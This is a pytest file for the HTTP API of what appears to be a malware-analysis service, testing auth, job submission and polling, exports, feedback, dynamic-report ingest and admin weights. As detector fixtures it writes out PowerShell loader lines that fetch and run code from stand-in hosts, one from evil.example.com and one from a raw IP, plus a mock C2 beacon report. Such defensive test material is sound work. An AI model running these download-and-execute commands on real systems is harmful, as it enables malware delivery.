"""The HTTP surface: auth, submit/poll, exports, feedback, dynamic ingest, admin.

These tests exercise the real request path, including the async runner: a
submission returns immediately and analysis finishes on a background thread, so
the verdict is read by polling ``/api/result`` — exactly what a client does.
"""
from __future__ import annotations

import time

from tests.conftest import WORKER_TOKEN


def _poll_until_done(client, headers, public_id, timeout=20.0):
    deadline = time.time() + timeout
    terminal = {"completed", "failed", "awaiting_password"}
    last = None
    while time.time() < deadline:
        response = client.get(f"/api/result/{public_id}", headers=headers)
        assert response.status_code == 200, response.text
        last = response.json()
        if last["status"] in terminal:
            return last
        time.sleep(0.05)
    raise AssertionError(f"job {public_id} did not finish; last status={last and last['status']}")


def _submit(client, headers, name, data):
    response = client.post(
        "/api/analyze",
        files={"file": (name, data, "application/octet-stream")},
        headers=headers,
    )
    assert response.status_code == 201, response.text
    return response.json()["public_id"]


# --- auth --------------------------------------------------------------------
def test_protected_route_requires_auth(client):
    assert client.get("/api/jobs").status_code == 401


def test_login_issues_a_usable_token(client):
    response = client.post(
        "/api/auth/login", json={"username": "analyst", "password": "analyst"}
    )
    assert response.status_code == 200
    body = response.json()
    assert body["subject"] == "analyst" and body["token"]

    headers = {"Authorization": f"Bearer {body['token']}"}
    assert client.get("/api/jobs", headers=headers).status_code == 200


def test_bad_credentials_are_rejected(client):
    response = client.post(
        "/api/auth/login", json={"username": "analyst", "password": "wrong"}
    )
    assert response.status_code == 401


# --- submit + poll -----------------------------------------------------------
def test_analyze_then_result_reaches_a_verdict(client, auth):
    script = (
        b"powershell -NoProfile -w hidden -EncodedCommand aQBlAHgA\n"
        b"$c = New-Object Net.WebClient\n"
        b"IEX ($c.DownloadString('http://evil.example.com/stage2.ps1'))\n"
        b"$c.DownloadFile('http://185.100.87.202/payload.exe', 'C:\\Temp\\p.exe')\n"
        b"[Convert]::FromBase64String('QUJDREVGRw==')\n"
    )
    public_id = _submit(client, auth, "loader.ps1", script)
    result = _poll_until_done(client, auth, public_id)

    assert result["status"] == "completed"
    assert result["family"] == "script"
    assert result["final_score"] >= 60
    assert result["tiers"]["static"]["ran"] is True
    assert result["tiers"]["dynamic"]["ran"] is False


def test_api_key_is_an_accepted_credential(client):
    # X-API-Key opens the programmatic path (default demo key is "demo-key").
    response = client.post(
        "/api/analyze",
        files={"file": ("note.txt", b"harmless text " * 5, "text/plain")},
        headers={"X-API-Key": "demo-key"},
    )
    assert response.status_code == 201, response.text
    assert response.json()["public_id"]


def test_wrong_api_key_is_rejected(client):
    response = client.post(
        "/api/analyze",
        files={"file": ("note.txt", b"hi", "text/plain")},
        headers={"X-API-Key": "not-the-key"},
    )
    assert response.status_code == 401


# --- exports -----------------------------------------------------------------
def test_exports_return_200_in_every_format(client, auth):
    public_id = _submit(
        client,
        auth,
        "loader.ps1",
        b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a'))\n",
    )
    _poll_until_done(client, auth, public_id)

    j = client.get(f"/api/jobs/{public_id}/export.json", headers=auth)
    assert j.status_code == 200 and j.json()["job_id"] == public_id

    s = client.get(f"/api/jobs/{public_id}/export.stix", headers=auth)
    assert s.status_code == 200 and s.json()["type"] == "bundle"

    p = client.get(f"/api/jobs/{public_id}/export.pdf", headers=auth)
    assert p.status_code == 200
    assert p.headers["content-type"] == "application/pdf"
    assert p.content[:5] == b"%PDF-"


# --- feedback ----------------------------------------------------------------
def test_feedback_is_stored_on_the_job(client, auth):
    public_id = _submit(client, auth, "note.txt", b"harmless " * 4)
    _poll_until_done(client, auth, public_id)

    response = client.post(
        f"/api/jobs/{public_id}/feedback",
        json={"verdict": "false_positive", "note": "known-good internal tool"},
        headers=auth,
    )
    assert response.status_code == 200
    assert response.json()["feedback"] == "false_positive"

    # It persists on the next read.
    reread = client.get(f"/api/result/{public_id}", headers=auth)
    assert reread.json()["feedback"] == "false_positive"


# --- dynamic tier ingest -----------------------------------------------------
def _dynamic_report_body():
    return {
        "engine": "native",
        "worker": "lab-01",
        "ran": True,
        "unavailable_reason": None,
        "signals": [
            {
                "id": "dynamic.process_injection",
                "title": "Injected into a remote process",
                "severity": "critical",
                "detail": "CreateRemoteThread into explorer.exe observed at runtime.",
                "evidence": {"target": "explorer.exe"},
            }
        ],
        "facts": {"detonated": True},
        "iocs": {
            "urls": ["http://c2.example.net/beacon"],
            "domains": ["c2.example.net"],
            "ips": [],
            "emails": [],
            "hashes": [],
            "file_paths": [],
            "registry_keys": [],
            "mutexes": ["Global\\abc123"],
        },
        "duration_ms": 4200,
        "timeline": [{"t_ms": 10, "kind": "process", "detail": "spawned child"}],
    }


def test_dynamic_report_merges_raises_score_and_marks_tier_ran(client, auth):
    public_id = _submit(
        client,
        auth,
        "loader.ps1",
        b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a'))\n",
    )
    before = _poll_until_done(client, auth, public_id)
    assert before["tiers"]["dynamic"]["ran"] is False
    score_before = before["final_score"]

    response = client.post(
        f"/api/dynamic/report/{public_id}",
        json=_dynamic_report_body(),
        headers={"X-Worker-Token": WORKER_TOKEN},
    )
    assert response.status_code == 200, response.text
    after = response.json()

    # Behaviour is evidence the static tier did not have: the score can only rise.
    assert after["final_score"] > score_before
    assert after["tiers"]["dynamic"]["ran"] is True
    # The dynamic finding arrived in the same Signal vocabulary and merged in.
    assert "dynamic.native" in after["analysis"]
    assert "c2.example.net" in after["iocs"]["domains"]


def test_dynamic_report_rejects_wrong_or_absent_worker_token(client, auth):
    public_id = _submit(client, auth, "note.txt", b"harmless " * 4)
    _poll_until_done(client, auth, public_id)

    # Wrong token.
    wrong = client.post(
        f"/api/dynamic/report/{public_id}",
        json=_dynamic_report_body(),
        headers={"X-Worker-Token": "not-the-token"},
    )
    assert wrong.status_code == 401

    # No token at all.
    absent = client.post(
        f"/api/dynamic/report/{public_id}", json=_dynamic_report_body()
    )
    assert absent.status_code == 401


def test_dynamic_queue_requires_the_worker_token(client, auth):
    assert client.get("/api/dynamic/queue").status_code == 401
    ok = client.get("/api/dynamic/queue", headers={"X-Worker-Token": WORKER_TOKEN})
    assert ok.status_code == 200
    assert isinstance(ok.json(), list)


# --- admin + metrics ---------------------------------------------------------
def test_admin_weights_update_normalises_and_persists(client, auth):
    response = client.put(
        "/api/admin/weights", json={"rule_weight": 3.0, "ai_weight": 1.0}, headers=auth
    )
    assert response.status_code == 200
    weights = response.json()
    assert abs(weights["rule"] - 0.75) < 1e-6
    assert abs(weights["model"] - 0.25) < 1e-6

    # Reachable read-back through the GET route as well.
    got = client.get("/api/admin/weights", headers=auth)
    assert got.status_code == 200 and abs(got.json()["rule"] - 0.75) < 1e-6


def test_admin_weights_requires_auth(client):
    assert client.put("/api/admin/weights", json={"rule_weight": 1.0}).status_code == 401


def test_metrics_endpoint_is_reachable(client):
    response = client.get("/metrics")
    assert response.status_code == 200
